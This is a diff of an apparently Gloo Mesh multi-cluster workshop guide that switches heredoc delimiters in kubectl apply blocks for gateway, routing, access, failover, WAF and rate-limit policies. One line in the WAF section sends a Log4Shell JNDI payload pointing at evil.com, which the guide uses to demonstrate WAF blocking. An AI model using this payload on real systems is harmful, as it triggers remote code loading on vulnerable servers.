@@ -227,7 +227,7 @@ kubectl create namespace backend-apis-team --context $MGMT
 2. Apply the workspaces to the Gloo Mesh Management Plane root config namespace `gloo-mesh`.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: Workspace
 metadata:
@@ -295,7 +295,7 @@ You use a virtual gateway to configure the Istio ingress gateway consistently ac
 1. Apply the VirtualGateway to define the listeners and hosts for `cluster1` ingress gateway.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -322,7 +322,7 @@ EOF
 2. Apply the RouteTable for the web team to define where traffic for the gateway should go.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -385,7 +385,7 @@ EOF
 3. Add AccessPolicies to explicitly allow traffic between the microservices in the backend-apis namespace and also from web-team workspace to the backend-apis-team workspace. As you can see, these policies can be very flexible.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: security.policy.gloo.solo.io/v2
 kind: AccessPolicy
 metadata:
@@ -444,7 +444,7 @@ kubectl apply --context $CLUSTER2 -f install/online-boutique/checkout-feature.ya
 2. Create a VirtualDestination with hostname `checkout.backend-apis-team.solo-io.mesh` for the checkout service.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualDestination
 metadata:
@@ -493,7 +493,7 @@ In order to see the full power of Gloo Mesh failover policies, make sure that th
 2. Create VirtualDestination for frontend application
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualDestination
 metadata:
@@ -516,7 +516,7 @@ EOF
 3. Update the RouteTable so the VirtualGateway will route to both frontend applications. This can be accomplished by simply routing to the frontend's VirtualDestination.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -570,7 +570,7 @@ for i in {1..6}; do curl -sSk http://$GLOO_GATEWAY | grep "Cluster Name:"; done
 5. You can create a Gloo Mesh `FailoverPolicy` custom resource to configure locality-based load balancing across your virtual destinations. Apply this policy now.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: resilience.policy.gloo.solo.io/v2
 kind: FailoverPolicy
 metadata:
@@ -592,7 +592,7 @@ EOF
 6. The failover policy tells Gloo Mesh _where_ to re-route failover traffic. But, you also need to tell Gloo Mesh _when_. To do so, create an outlier detection policy. This policy sets up several conditions, such as retries and ejection percentages, for Gloo Mesh to use before failing over traffic.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: resilience.policy.gloo.solo.io/v2
 kind: OutlierDetectionPolicy
 metadata:
@@ -687,7 +687,7 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -748,7 +748,7 @@ kubectl --context ${CLUSTER1} -n istio-gateways create secret generic tls-secret
 
 2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -849,7 +849,7 @@ The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServ
 * Apply the `RateLimitPolicy`
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitClientConfig
 metadata:
